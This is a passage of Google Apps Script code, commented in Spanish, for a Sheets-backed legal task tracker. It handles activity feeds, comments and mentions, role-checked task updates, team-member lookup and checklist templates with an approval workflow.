    if (!myName) return [];
    var ws = _activitySheet(ctx.ss);
    var lr = ws.getLastRow();
    if (lr < 2) return [];
    var data = ws.getRange(2, 1, lr - 1, 9).getValues();
    // Construir set de mis tasks (resp = myName) buscando en activo + historial
    var myTaskIds = {};
    var _myNorm = _normalizeName(myName);
    // Mis tasks: donde soy resp, O donde soy COLABORADOR — así getMyRecentActivity
    // también notifica la actividad de tareas compartidas conmigo (incluido el
    // momento en que me agregan como colaborador).
    function _collectMyTasks(sheet) {
      if (!sheet || sheet.getLastRow() < 4) return;
      var w = Math.min(sheet.getLastColumn(), TASK_COLAB_COL);
      var rows = sheet.getRange(4, 1, sheet.getLastRow() - 3, w).getValues();
      rows.forEach(function(r){
        if (!r[0]) return;
        if (r[2] === myName) { myTaskIds[String(r[0])] = 1; return; }
        if (w >= TASK_COLAB_COL) {
          var colabs = _parseColaboradores(r[TASK_COLAB_COL - 1]);
          for (var k = 0; k < colabs.length; k++) {
            if (_normalizeName(colabs[k].name) === _myNorm) { myTaskIds[String(r[0])] = 1; return; }
          }
        }
      });
    }
    var aWs = ctx.ss.getSheetByName(SHEET_ACTIVO);
    var hWs = ctx.ss.getSheetByName(SHEET_HISTORIAL);
    _collectMyTasks(aWs);
    _collectMyTasks(hWs);
    var sinceMs = sinceIso ? new Date(sinceIso).getTime() : 0;
    if (isNaN(sinceMs)) sinceMs = 0;
    var out = [];
    function _toIso(v){ if(!v) return ''; return v instanceof Date ? v.toISOString() : String(v); }
    for (var i = data.length - 1; i >= 0 && out.length < 30; i--) {
      var r = data[i];
      var rowEmail = (r[3] || '').toString().toLowerCase();
      if (rowEmail === myEmail) continue; // skip mis propias acciones
      var taskId = String(r[2]);
      // Incluir: (a) actividad sobre una tarea mía (resp/colaborador), o
      // (b) una @mención DIRIGIDA a mí (action='mention', field = mi nombre) —
      // aunque la tarea no sea mía. Sin (b), una mención en una tarea ajena
      // solo llegaba por email y el bell no la mostraba.
      var isMine = !!myTaskIds[taskId];
      var isMentionForMe = (r[5] === 'mention') && (_normalizeName(r[6]) === _myNorm);
      if (!isMine && !isMentionForMe) continue;
      var ts = r[1] instanceof Date ? r[1].getTime() : new Date(r[1]).getTime();
      if (sinceMs && ts <= sinceMs) break; // ordenadas desc; cuando entras al ts viejo, frenar
      out.push({
        id: r[0], ts: _toIso(r[1]), task_id: r[2],
        author_email: r[3] || '', author_name: r[4] || '',
        action: r[5] || '', field: r[6] || '',
        old_value: r[7] || '', new_value: r[8] || ''
      });
    }
    return out;
  }, { since: !!sinceIso });
}

function _addTaskCommentImpl(taskId, body) {
  var ctx = _getAuthContext();
  var trimmed = (body || '').toString().trim();
  if (!trimmed) return { success: false, error: 'Comment body required' };
  if (trimmed.length > 5000) return { success: false, error: 'Comment too long (max 5000 chars)' };
  // CRÍTICO: validar visibilidad antes de escribir. Sin esto, cualquier
  // allowlisted user podía postear en CUALQUIER taskId (incluso tasks de
  // otro país o confidenciales que no podía ver) usando google.script.run
  // directamente desde DevTools. _canUserSeeTask cubre activo + historial.
  if (!_canUserSeeTask(ctx, taskId)) {
    return { success: false, error: 'No tenés acceso a esta tarea.' };
  }
  var authorEmail = ctx.email || '';
  var authorName  = (ctx.user && ctx.user.name) || '';
  var ws = _commentsSheet(ctx.ss);
  // Auto-promote: si el comentario lo agrega el responsable de una tarea
  // 'Pendiente', promovemos a 'En curso'. Señal clara de que ya empezó.
  var promotedStatus = null;
  var taskForPromote = _readTaskById(ctx.ss, taskId);
  if (taskForPromote && taskForPromote.status === 'Pendiente'
      && _normalizeName(taskForPromote.resp) === _normalizeName(authorName)) {
    try {
      var ws_a = ctx.ss.getSheetByName(SHEET_ACTIVO);
      ws_a.getRange(taskForPromote.row, 7).setValue('En curso');
      promotedStatus = 'En curso';
    } catch (e) { Logger.log('auto-promote on comment skipped: ' + ((e && e.message) || e)); }
  }
  var lock = LockService.getScriptLock();
  try { lock.waitLock(8000); } catch (e) { throw new Error('Server busy, retry in a moment.'); }
  try {
    var newId = _nextCommentId(ws);
    var ts = new Date();
    var row = [newId, taskId, authorEmail, authorName, ts, trimmed];
    ws.appendRow(_sanitizeRow(row));
    _logActivity(ctx, taskId, 'comment', 'comment', '', trimmed.substring(0, 100));
    // Avisar a los mencionados con @nombre. canSeeName solo si el mencionado
    // ya tiene acceso (es el resp o un colaborador) — sino el nombre de una
    // tarea sensible no viaja (el aviso va genérico con el #id).
    var mentioned = _extractMentions(ctx, trimmed);
    if (mentioned.length) {
      var taskNow = taskForPromote || _readTaskById(ctx.ss, taskId);
      var respNorm = taskNow ? _normalizeName(taskNow.resp) : '';
      var colabNorms = {};
      (taskNow && taskNow.colaboradores || []).forEach(function(c){ colabNorms[_normalizeName(c.name)] = 1; });
      mentioned.forEach(function(nm){
        var nn = _normalizeName(nm);
        var hasAccess = (nn === respNorm) || !!colabNorms[nn];
        _notify(ctx, nm, { kind: 'mention', taskId: taskId, taskName: taskNow && taskNow.nombre,
                           conf: taskNow && taskNow.confidencialidad, snippet: trimmed, canSeeName: hasAccess });
        // In-app: si el mencionado NO es resp/colaborador, el feed "actividad
        // sobre mis tareas" no lo agarra → logueamos una fila 'mention'
        // dirigida (field = su nombre) para que su bell la muestre. Si SÍ tiene
        // acceso, ya verá la fila 'comment' de la tarea — no duplicar.
        if (!hasAccess) {
          _logActivity(ctx, taskId, 'mention', nm, '', trimmed.substring(0, 100));
        }
      });
    }
    return {
      success: true,
      promoted: promotedStatus, // 'En curso' si el comentario promovió la tarea; sino null
      comment: {
        id: newId,
        task_id: taskId,
        author_email: authorEmail,
        author_name: authorName,
        ts: ts.toISOString(),
        body: trimmed
      }
    };
  } finally {
    lock.releaseLock();
  }
}

function updateTaskField(taskId, field, value) { return _safeMutation(function() { return _updateTaskFieldImpl(taskId, field, value); }); }
function _updateTaskFieldImpl(taskId, field, value) {
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return { success: false, error: 'Task #' + taskId + ' not found' };
  _authorizeTaskWrite(ctx, current);

  var fieldMap = {'nombre':2,'resp':3,'acc':4,'deadline':5,'priority':6,'status':7,'notas':11,'proyecto':12,'proyectoId':12,'pais':13,'lider':14,'tipoTrabajo':15,'riesgo':16,'confidencialidad':18,'contraparte':19,'areaSolicitante':20};
  var col = fieldMap[field];
  if (!col) return { success: false, error: 'Invalid field: ' + field };

  // Specialist no puede reasignar resp (sacarse la tarea de encima); manager
  // sí puede reasignar dentro de su país. Chequeo extra solo si field==='resp'.
  if (field === 'resp' && ctx.role === 'specialist' && value !== ctx.user.name) {
    throw new Error('Sin permiso: no puedes reasignar tareas');
  }
  if (field === 'pais' && ctx.role === 'manager' && value !== ctx.user.code) {
    throw new Error('Sin permiso: no puedes mover tareas a otro país');
  }
  if (field === 'pais' && ctx.role === 'specialist' && value !== ctx.user.code) {
    throw new Error('Sin permiso: no puedes cambiar el país de la tarea');
  }
  // Solo manager/head pueden cambiar el nivel de confidencialidad de una tarea.
  if (field === 'confidencialidad' && ctx.role !== 'manager' && ctx.role !== 'head') {
    throw new Error('Sin permiso: solo manager o head pueden cambiar confidencialidad');
  }

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  // Guard anti-drift: no escribir en columnas que la hoja todavía no tiene
  // (Documentos/Confidencialidad/Contraparte en deploys sin setupSheets). Sin
  // esto Sheets auto-expande la hoja y escribe en una columna sin header, lo
  // que desplaza cómo se interpretan todas las lecturas posteriores. addTask ya
  // hace este guard al crear; lo replicamos acá para los updates.
  if (col > ws.getLastColumn()) {
    return { success: false, error: 'La hoja no tiene la columna para "' + field + '". Pedile al admin que corra setupSheets().' };
  }
  // Normalizar proyectoId a entero (o vacío)
  if (field === 'proyectoId' || field === 'proyecto') {
    var n = parseInt(value, 10);
    value = isNaN(n) ? '' : n;
  }
  // Deadline ISO → Date real (mediodía local), igual que en proyectos. Si se
  // escribe como string, readTasks puede no derivar deadlineISO (depende del
  // locale de la hoja) y la tarea queda sin ETA, fuera del SLA y del digest.
  if (field === 'deadline') value = _deadlineToCell(value);
  // Lock para serializar la escritura de la celda. moveToHistorial tiene su propio
  // lock interno, por eso lo invocamos FUERA del bloque (el lock de Apps Script no
  // es reentrante de forma garantizada, así evitamos cualquier deadlock).
  var oldValue = current[field] || current[fieldMap[field]] || '';
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  var movedToHistorial = false;
  try {
    ws.getRange(current.row, col).setValue(_sanitizeCell(value));
    if (field === 'status' && value === 'Listo') {
      ws.getRange(current.row, 10).setValue(new Date());
      movedToHistorial = true;
    }
    // BlockedSince (col 22, opcional): sella el momento del bloqueo para poder
    // mostrar "bloqueada hace Nd"; se limpia al salir de Bloqueado. Guard
    // anti-drift: solo si la hoja ya tiene la columna (migrarBlockedSince).
    if (field === 'status' && ws.getLastColumn() >= TASK_BLOCKED_COL) {
      if (value === 'Bloqueado' && current.status !== 'Bloqueado') {
        ws.getRange(current.row, TASK_BLOCKED_COL).setValue(new Date());
      } else if (value !== 'Bloqueado' && current.status === 'Bloqueado') {
        ws.getRange(current.row, TASK_BLOCKED_COL).setValue('');
      }
    }
  } finally {
    lock.releaseLock();
  }
  // Activity log (best-effort, no aborta mutation)
  _logActivity(ctx, taskId, field === 'status' ? 'status_change' : (field === 'resp' ? 'reassign' : 'update'), field, oldValue, value);
  // Aviso al nuevo responsable (cubre reasignación individual y bulk — el bulk
  // llama updateTaskField por id). Solo si el resp realmente cambió a otra
  // persona. canSeeName: ya es el responsable, ve la tarea.
  if (field === 'resp' && value && _normalizeName(value) !== _normalizeName(current.resp)) {
    _notify(ctx, value, { kind: 'reassign', taskId: taskId, taskName: current.nombre,
                          conf: current.confidencialidad, canSeeName: true });
  }
  if (movedToHistorial) {
    moveToHistorial(ctx.ss, ws, current.row);
    return { success: true, moved: true, message: 'Tarea movida a Historial' };
  }
  // Auto-promote: si la tarea estaba "Pendiente" y el specialist responsable
  // edita notas o asigna proyecto/contraparte/etc, promovemos a "En curso"
  // automáticamente. Antes el specialist tenía que cambiar el status manual
  // — many no lo hacían y las métricas de "En curso" arrancaban en 0.
  // Sólo si: status no fue el field cambiado, status actual es 'Pendiente',
  // el user es el resp de la tarea, y el field cambiado es "trabajo" no metadata.
  var promotedToEnCurso = false;
  if (field !== 'status' && current.status === 'Pendiente'
      && ctx.user && ctx.user.name === current.resp
      && (field === 'notas' || field === 'acc' || field === 'contraparte' || field === 'proyectoId' || field === 'proyecto')) {
    try {
      ws.getRange(current.row, 7).setValue('En curso');
      promotedToEnCurso = true;
    } catch(e) { Logger.log('auto-promote skipped: ' + ((e && e.message) || e)); }
  }
  return promotedToEnCurso
    ? { success: true, promoted: 'En curso' }
    : { success: true };
}
// Batch update: aplica varios campos en una sola llamada.
// Si `status` es 'Listo', se aplica al final y dispara el move a Historial (los demás campos ya quedaron escritos).
function updateTaskFields(taskId, fields) {
  return _telemetry('updateTaskFields', function() {
    return _safeMutation(function() { return _updateTaskFieldsImpl(taskId, fields); });
  }, { taskId: taskId, fieldCount: (fields && typeof fields === 'object') ? Object.keys(fields).length : 0, hasStatus: !!(fields && fields.status) });
}
function _updateTaskFieldsImpl(taskId, fields) {
  if (!fields || typeof fields !== 'object') return { success: false, error: 'Invalid fields' };
  var ctx = _getAuthContext();
  var current = _readTaskById(ctx.ss, taskId);
  if (!current) return { success: false, error: 'Task #' + taskId + ' not found' };
  _authorizeTaskWrite(ctx, current);

  // Chequeos extra para reasignaciones no permitidas
  if (ctx.role === 'specialist' && fields.resp !== undefined && fields.resp !== ctx.user.name) {
    throw new Error('Sin permiso: no puedes reasignar tareas');
  }
  if (ctx.role === 'manager' && fields.pais !== undefined && fields.pais !== ctx.user.code) {
    throw new Error('Sin permiso: no puedes mover tareas a otro país');
  }
  if (ctx.role === 'specialist' && fields.pais !== undefined && fields.pais !== ctx.user.code) {
    throw new Error('Sin permiso: no puedes cambiar el país de la tarea');
  }
  // Solo manager/head pueden cambiar el nivel de confidencialidad de una tarea.
  if (fields.confidencialidad !== undefined && ctx.role !== 'manager' && ctx.role !== 'head') {
    throw new Error('Sin permiso: solo manager o head pueden cambiar confidencialidad');
  }

  var ws = ctx.ss.getSheetByName(SHEET_ACTIVO);
  var fieldMap = {'nombre':2,'resp':3,'acc':4,'deadline':5,'priority':6,'status':7,'notas':11,'proyecto':12,'proyectoId':12,'pais':13,'lider':14,'tipoTrabajo':15,'riesgo':16,'confidencialidad':18,'contraparte':19,'areaSolicitante':20};
  var row = current.row;
  // Ancho real de la hoja: si una columna opcional (Documentos/Confidencialidad/
  // Contraparte) todavía no existe, se omite en lugar de auto-expandir la hoja
  // sin header (evita drift de esquema). Mismo criterio que addTask.
  var lc = ws.getLastColumn();

  // Lock para serializar mutaciones. moveToHistorial se llama fuera del bloque
  // (tiene su propio lock interno; evitamos asumir reentrancia).
  var lock = LockService.getScriptLock();
  try { lock.waitLock(10000); } catch(e) { throw new Error('Servidor ocupado, reintenta en un momento.'); }
  var movedToHistorial = false;
  try {
    // 1) Aplicar todos los campos menos status
    Object.keys(fields).forEach(function(k) {
      if (k === 'status') return;
      var col = fieldMap[k];
      if (!col || col > lc) return; // omitir columnas inexistentes (anti-drift)
      var v = fields[k];
      if (k === 'proyectoId' || k === 'proyecto') {
        var n = parseInt(v, 10);
        v = isNaN(n) ? '' : n;
      }
      // Deadline ISO → Date real (ver _updateTaskFieldImpl / proyectos).
      if (k === 'deadline') v = _deadlineToCell(v);
      ws.getRange(row, col).setValue(_sanitizeCell(v));
    });

    // 2) Status al final (puede disparar move a Historial)
    if (fields.status !== undefined) {
      ws.getRange(row, 7).setValue(_sanitizeCell(fields.status));
      if (fields.status === 'Listo') {
        ws.getRange(row, 10).setValue(new Date());
        movedToHistorial = true;
      }
      // BlockedSince (col 22, opcional): mismo sello/limpieza que updateTaskField.
      if (lc >= TASK_BLOCKED_COL) {
        if (fields.status === 'Bloqueado' && current.status !== 'Bloqueado') {
          ws.getRange(row, TASK_BLOCKED_COL).setValue(new Date());
        } else if (fields.status !== 'Bloqueado' && current.status === 'Bloqueado') {
          ws.getRange(row, TASK_BLOCKED_COL).setValue('');
        }
      }
    }
  } finally {
    lock.releaseLock();
  }
  // Aviso al nuevo responsable si la reasignación vino en el batch.
  if (fields.resp !== undefined && fields.resp && _normalizeName(fields.resp) !== _normalizeName(current.resp)) {
    _notify(ctx, fields.resp, { kind: 'reassign', taskId: taskId, taskName: current.nombre,
                                conf: (fields.confidencialidad || current.confidencialidad), canSeeName: true });
  }
  if (movedToHistorial) {
    moveToHistorial(ctx.ss, ws, row);
    // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
    return { success: true, moved: true, message: 'Tarea movida a Historial' };
  }
  // invalidateCache() lo dispara _safeMutation; no llamar acá (doble call).
  return { success: true };
}

// ════════════════════════════════════════════════════════════════
// EQUIPOS / CONFIG / HELPERS
// ════════════════════════════════════════════════════════════════
function readEquipos(ss){var ws=ss.getSheetByName(SHEET_EQUIPOS);if(!ws)return getDefaultEquipos();var lr=ws.getLastRow();if(lr<2)return getDefaultEquipos();var data=ws.getRange(2,1,lr-1,8).getValues();var eq=[];data.forEach(function(r){var c=(r[0]||'').toString().trim();if(!c)return;eq.push({code:c,country:(r[1]||'').toString().trim(),leader:(r[2]||'').toString().trim().replace(/\n/g,''),leaderEmail:(r[3]||'').toString().trim(),members:(r[4]||'').toString().split(',').map(function(s){return s.trim()}).filter(Boolean),emails:(r[5]||'').toString().split(',').map(function(s){return s.trim()}).filter(Boolean),slackChannel:(r[6]||'').toString().trim(),notes:(r[7]||'').toString().trim()})});return eq.length>0?eq:getDefaultEquipos()}
function getDefaultEquipos(){return [{code:'CO',country:'Colombia',leader:'Carlos Eduardo Fernández',leaderEmail:'',members:['Isabela Zuluaga','Nicolás Naranjo','Juan Manuel Caicedo','Juan Camilo Gallego','Valeria Rangel','David Gaviria'],emails:[],slackChannel:'',notes:''}]}
function getAllMembers(eq){var n={};eq.forEach(function(e){if(e.leader)n[e.leader]=1;e.members.forEach(function(m){n[m]=1})});return Object.keys(n).sort()}
// Cache module-level de normalizaciones: evita reprocesar miles de veces el mismo nombre
// en stats/refresh. La clave es el string crudo; el value es el normalizado.
// También cacheamos el "índice" de equipos (por identidad de array) para no retokenizar
// en cada call durante el mismo request.
var _NAME_NORM_CACHE = {};
var _EQUIPOS_INDEX_CACHE = { ref: null, idx: null };
function _normalizeName(s){
  if(s==null) return '';
  var raw = s.toString();
  if(_NAME_NORM_CACHE.hasOwnProperty(raw)) return _NAME_NORM_CACHE[raw];
  var out = raw;
  // Rango Unicode de diacríticos combinantes U+0300..U+036F. Construimos el regex con
  // \u-escapes vía RegExp() para ser independientes del encoding del archivo fuente.
  try { out = out.normalize('NFD').replace(new RegExp('[\\u0300-\\u036f]','g'),''); } catch(e) {}
  out = out.toLowerCase().replace(/\s+/g,' ').replace(/^ +| +$/g,'');
  _NAME_NORM_CACHE[raw] = out;
  return out;
}
// Construye (o reutiliza) un índice {entries:[{code,name,norm,tokens,isLeader,email}], ...}
// para una lista de equipos dada. Cacheado por identidad del array eq.
function _buildEquiposIndex(eq){
  if(_EQUIPOS_INDEX_CACHE.ref === eq && _EQUIPOS_INDEX_CACHE.idx) return _EQUIPOS_INDEX_CACHE.idx;
  var entries = [];
  for(var i=0;i<eq.length;i++){
    var team = eq[i];
    if(team.leader){
      var ln = _normalizeName(team.leader);
      entries.push({code:team.code,name:team.leader,norm:ln,tokens:ln.split(' ').filter(Boolean),isLeader:true,email:team.leaderEmail||'',order:entries.length});
    }
    var mem = team.members||[], emails = team.emails||[];
    for(var j=0;j<mem.length;j++){
      var mn = _normalizeName(mem[j]);
      entries.push({code:team.code,name:mem[j],norm:mn,tokens:mn.split(' ').filter(Boolean),isLeader:false,email:emails[j]||'',order:entries.length});
    }
  }
  var idx = {entries:entries};
  _EQUIPOS_INDEX_CACHE = {ref:eq, idx:idx};
  return idx;
}
// Busca el entry que corresponde a `name` aplicando: (1) match exacto normalizado,
// (2) match por tokens (todos los tokens del query ⊂ tokens del candidato).
// Desempate: exacto > nombre más corto (menos tokens) > primer orden de aparición.
function _findMemberEntry(name, eq){
  if(!name) return null;
  var idx = _buildEquiposIndex(eq);
  var qNorm = _normalizeName(name);
  if(!qNorm) return null;
  var entries = idx.entries;
  // 1) Exacto normalizado
  for(var i=0;i<entries.length;i++){
    if(entries[i].norm === qNorm) return entries[i];
  }
  // 2) Match por tokens
  var qTokens = qNorm.split(' ').filter(Boolean);
  if(!qTokens.length) return null;
  var best = null;
  for(var k=0;k<entries.length;k++){
    var e = entries[k];
    var et = e.tokens; if(!et.length) continue;
    var allIn = true;
    for(var t=0;t<qTokens.length;t++){
      if(et.indexOf(qTokens[t])<0){ allIn = false; break; }
    }
    if(!allIn) continue;
    if(!best){ best = e; continue; }
    // Preferir nombre más corto (menos tokens); empate → primero en el sheet (ya está por order).
    if(e.tokens.length < best.tokens.length) best = e;
  }
  return best;
}
function getCountryForMember(name,eq){
  var hit = _findMemberEntry(name, eq);
  return hit ? hit.code : '';
}
// Resuelve un miembro/líder por nombre con normalización tolerante.
// Devuelve {name, code, email, isLeader} o null. Útil para resolver email al notificar.
function getMemberByName(name, eq){
  var hit = _findMemberEntry(name, eq);
  if(!hit) return null;
  return {name:hit.name, code:hit.code, email:hit.email||'', isLeader:!!hit.isLeader};
}
function getLeaderForCountry(code,eq){for(var i=0;i<eq.length;i++){if(eq[i].code===code)return eq[i].leader}return ''}
function readConfig(ss){var ws=ss.getSheetByName(SHEET_CONFIG);if(!ws)return {};var lr=ws.getLastRow();if(lr<3)return {};var data=ws.getRange(3,1,lr-2,2).getValues(),c={};data.forEach(function(r){if(r[0])c[r[0]]=r[1]});return c}

// ── TEMPLATES ───────────────────────────────────────────────────
// Hoja opcional 'Templates' con columnas: tipoTrabajo | checklist (JSON array).
// readTemplates(ss) → { tipoTrabajo: ['item1', ...] }. Si la hoja no existe o
// está vacía retorna {} (no error). Filas con JSON inválido se loggean y se
// saltan. Backwards-compat: si la hoja no existe, la app sigue funcionando.
// Hoja Templates: cols tipoTrabajo | checklist(JSON) | estado | autor.
// estado: 'aprobada' | 'pendiente'. Vacío (filas legacy) = aprobada.
// Wizard dict: SOLO aprobadas (las pendientes no pre-llenan Crear).
function readTemplates(ss) {
  var ws = ss.getSheetByName(SHEET_TEMPLATES);
  if (!ws) return {};
  var lr = ws.getLastRow();
  if (lr < 2) return {};
  var data = ws.getRange(2, 1, lr - 1, 4).getValues();
  var out = {};
  data.forEach(function(r) {
    var tipo = (r[0] || '').toString().trim();
    var raw  = (r[1] || '').toString().trim();
    var estado = (r[2] || '').toString().trim().toLowerCase();
    if (!tipo || !raw) return;
    if (estado === 'pendiente') return; // pendientes no van al wizard
    try {
      var arr = JSON.parse(raw);
      if (Array.isArray(arr)) {
        out[tipo] = arr.map(function(s){ return String(s); }).filter(Boolean);
      } else {
        Logger.log('readTemplates: fila con checklist no-array para tipo "' + tipo + '"; se omite.');
      }
    } catch (e) {
      Logger.log('readTemplates: JSON inválido para tipo "' + tipo + '": ' + ((e && e.message) || e));
    }
  });
  return out;
}

// Asegura la hoja Templates con headers de 4 columnas.
function _ensureTemplatesSheet(ss) {
  var ws = ss.getSheetByName(SHEET_TEMPLATES);
  if (!ws) {
    ws = ss.insertSheet(SHEET_TEMPLATES);
    ws.getRange(1, 1, 1, 4).setValues([['tipoTrabajo', 'checklist', 'estado', 'autor']]);
    ws.getRange(1, 1, 1, 4).setFontWeight('bold');
    ws.setFrozenRows(1);
  }
  return ws;
}

// Busca la fila de una plantilla por (tipo, estado). Vacío en sheet = aprobada.
function _tplFindRow(ws, tipo, estado) {
  var lr = ws.getLastRow();
  if (lr < 2) return -1;
  var data = ws.getRange(2, 1, lr - 1, 3).getValues();
  for (var i = 0; i < data.length; i++) {
    if ((data[i][0] || '').toString().trim() !== tipo) continue;
    var e = (data[i][2] || '').toString().trim().toLowerCase();
    if (e !== 'pendiente') e = 'aprobada';
    if (e === estado) return i + 2;
  }
  return -1;
}

// Lista completa para la vista Biblioteca: incluye estado + autor de cada
// plantilla (aprobadas y pendientes). No se cachea (necesita estado fresco).
function getBibliotecaTemplates() {
  return _telemetry('getBibliotecaTemplates', function() {
    var ss = SpreadsheetApp.openById(SHEET_ID);
    var ws = ss.getSheetByName(SHEET_TEMPLATES);
    if (!ws) return { items: [] };
    var lr = ws.getLastRow();
    if (lr < 2) return { items: [] };
    var data = ws.getRange(2, 1, lr - 1, 4).getValues();
    var items = [];
    data.forEach(function(r) {
      var tipo = (r[0] || '').toString().trim();
      var raw  = (r[1] || '').toString().trim();
      if (!tipo || !raw) return;
      var estado = (r[2] || '').toString().trim().toLowerCase();
      if (estado !== 'pendiente') estado = 'aprobada';
      var arr = [];
      try { var p = JSON.parse(raw); if (Array.isArray(p)) arr = p.map(function(s){ return String(s); }).filter(Boolean); } catch (e) {}
      items.push({ tipo: tipo, checklist: arr, estado: estado, autor: (r[3] || '').toString().trim() });
    });
    return { items: items };
  });
}

// Entry-point expuesto al frontend vía google.script.run. Cachea 1h bajo
// 'templates_v1' (igual patrón que las otras caches: read-through + serialize).
function getTemplates() {
  return _telemetry('getTemplates', _getTemplatesImpl);
}
function _getTemplatesImpl() {
  var cacheKey = 'templates_v1';
  try {
    var cached = CacheService.getScriptCache().get(cacheKey);
    if (cached) return JSON.parse(cached);
  } catch (e) {}
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var dict = readTemplates(ss);
  try { CacheService.getScriptCache().put(cacheKey, JSON.stringify(dict), 3600); } catch (e) {}
  return dict;
}

// ── Crear / aprobar / eliminar plantillas desde la UI ───────────
// Cualquiera puede crear: specialist → 'pendiente' (requiere aprobación de
// manager/Global); manager/head → 'aprobada' directo. Upsert por (tipo,estado):
// a lo sumo una aprobada + una pendiente por tipo. Invalidan templates_v1 para
// que el wizard de Crear refleje el cambio.
function saveTemplate(tipoTrabajo, checklistArray) {
  return _telemetry('saveTemplate', function() {
    return _safeMutation(function() { return _saveTemplateImpl(tipoTrabajo, checklistArray); });
  }, { tipo: tipoTrabajo });
}
function _saveTemplateImpl(tipoTrabajo, checklistArray) {
  var ctx = _getAuthContext();
  var tipo = (tipoTrabajo || '').toString().trim();
  if (!tipo) return { success: false, error: 'Elegí un tipo de trabajo.' };
  if (!Array.isArray(checklistArray)) return { success: false, error: 'checklist debe ser un array.' };
  // Sanitize: trim cada item, cap 200 chars, drop empties, max 50 items.
  var clean = checklistArray
    .map(function(it){ return String(it == null ? '' : it).trim().slice(0, 200); })
    .filter(Boolean)
    .slice(0, 50);
  if (!clean.length) return { success: false, error: 'Agregá al menos un ítem al checklist.' };
  var estado = (ctx.role === 'manager' || ctx.role === 'head') ? 'aprobada' : 'pendiente';
  var autor = (ctx.user && ctx.user.name) || ctx.email || '';
  var ws = _ensureTemplatesSheet(ctx.ss);
  var lock = LockService.getScriptLock();
  try { lock.waitLock(8000); } catch (e) { throw new Error('Servidor ocupado, reintentá en un momento.'); }
  try {
    var rowIdx = _tplFindRow(ws, tipo, estado);
    var payload = _sanitizeRow([tipo, JSON.stringify(clean), estado, autor]);
    if (rowIdx > 0) ws.getRange(rowIdx, 1, 1, 4).setValues([payload]);
    else ws.appendRow(payload);
    try { CacheService.getScriptCache().remove('templates_v1'); } catch (e) {}
    return { success: true, tipo: tipo, estado: estado, checklist: clean };
  } finally {
    lock.releaseLock();
  }
}

// Aprueba la propuesta pendiente de un tipo: borra la aprobada vigente (si la
// hay) y promueve la pendiente a aprobada. Solo manager/head.
function approveTemplate(tipoTrabajo) {
  return _telemetry('approveTemplate', function() {
    return _safeMutation(function() { return _approveTemplateImpl(tipoTrabajo); });
  }, { tipo: tipoTrabajo });
}
function _approveTemplateImpl(tipoTrabajo) {
  var ctx = _getAuthContext();
  if (ctx.role !== 'manager' && ctx.role !== 'head') {
    return { success: false, error: 'Solo managers o Global pueden aprobar plantillas.' };
  }
  var tipo = (tipoTrabajo || '').toString().trim();
  if (!tipo) return { success: false, error: 'Tipo requerido.' };
  var ws = ctx.ss.getSheetByName(SHEET_TEMPLATES);
  if (!ws) return { success: false, error: 'No hay plantillas todavía.' };
  var lock = LockService.getScriptLock();
  try { lock.waitLock(8000); } catch (e) { throw new Error('Servidor ocupado, reintentá en un momento.'); }
  try {
    var pendIdx = _tplFindRow(ws, tipo, 'pendiente');
    if (pendIdx < 0) return { success: false, error: 'No hay propuesta pendiente para este tipo.' };
    var apprIdx = _tplFindRow(ws, tipo, 'aprobada');
    if (apprIdx > 0) {
      ws.deleteRow(apprIdx);
      if (apprIdx < pendIdx) pendIdx--; // la fila pendiente se corrió hacia arriba
    }
    ws.getRange(pendIdx, 3).setValue('aprobada');
    try { CacheService.getScriptCache().remove('templates_v1'); } catch (e) {}
    return { success: true, tipo: tipo };
  } finally {
    lock.releaseLock();
  }
}

// Elimina una plantilla por (tipo, estado). manager/head: cualquiera.
// specialist: solo sus propias propuestas pendientes.
function deleteTemplate(tipoTrabajo, estado) {
  return _telemetry('deleteTemplate', function() {
    return _safeMutation(function() { return _deleteTemplateImpl(tipoTrabajo, estado); });
  }, { tipo: tipoTrabajo });
}
function _deleteTemplateImpl(tipoTrabajo, estado) {
  var ctx = _getAuthContext();
  var tipo = (tipoTrabajo || '').toString().trim();
  if (!tipo) return { success: false, error: 'Tipo requerido.' };
  var est = (estado || 'aprobada').toString().trim().toLowerCase();
  if (est !== 'pendiente') est = 'aprobada';
  var isManager = (ctx.role === 'manager' || ctx.role === 'head');
  var ws = ctx.ss.getSheetByName(SHEET_TEMPLATES);
  if (!ws) return { success: false, error: 'No hay plantillas todavía.' };
  var lock = LockService.getScriptLock();
  try { lock.waitLock(8000); } catch (e) { throw new Error('Servidor ocupado, reintentá en un momento.'); }
  try {
    var rowIdx = _tplFindRow(ws, tipo, est);
    if (rowIdx < 0) return { success: false, error: 'Plantilla no encontrada.' };
    if (!isManager) {
      if (est !== 'pendiente') return { success: false, error: 'Solo managers o Global pueden eliminar plantillas aprobadas.' };
      var autorCell = (ws.getRange(rowIdx, 4).getValue() || '').toString().trim();
      if (_normalizeName(autorCell) !== _normalizeName((ctx.user && ctx.user.name) || '')) {
        return { success: false, error: 'Solo podés eliminar tus propias propuestas.' };
      }
    }
    ws.deleteRow(rowIdx);
    try { CacheService.getScriptCache().remove('templates_v1'); } catch (e) {}
    return { success: true, tipo: tipo, estado: est };
  } finally {
    lock.releaseLock();
  }
}

// ════════════════════════════════════════════════════════════════
// BIBLIOTECA · DOCUMENTOS (enlaces + archivos en Drive)
// ════════════════════════════════════════════════════════════════
// Hoja BibliotecaDocs (v2, 16 cols):
//  id | nombre | tipo | url | tipoDocumento | areaTrabajo | pais | confidencialidad
//   | tags | autor | autorEmail | fecha | vigente | notas | actualizadoPor | fechaActualizado
// Vocabularios controlados + filtrado server-side por rol/confidencialidad (igual que tareas).
var _BIB_TIPOS_DOC = ['Contrato modelo', 'Política', 'Dictamen', 'Precedente', 'Normativa', 'Poder', 'Minuta', 'Guía / Playbook', 'Formato / Checklist', 'Otro'];
var _BIB_AREAS = ['Contractual', 'Regulatorio', 'Contencioso', 'Privacy', 'Operativo', 'Transversal'];
var _BIB_PAISES = ['CO', 'MX', 'BR', 'AR', 'CL', 'CR', 'PE', 'EC', 'UY', 'LATAM', 'Global'];
var _BIB_CONFID = ['estandar', 'restringido', 'confidencial'];
var _BIB_HEADERS = ['id', 'nombre', 'tipo', 'url', 'tipoDocumento', 'areaTrabajo', 'pais', 'confidencialidad', 'tags', 'autor', 'autorEmail', 'fecha', 'vigente', 'notas', 'actualizadoPor', 'fechaActualizado', 'areaSolicitante'];
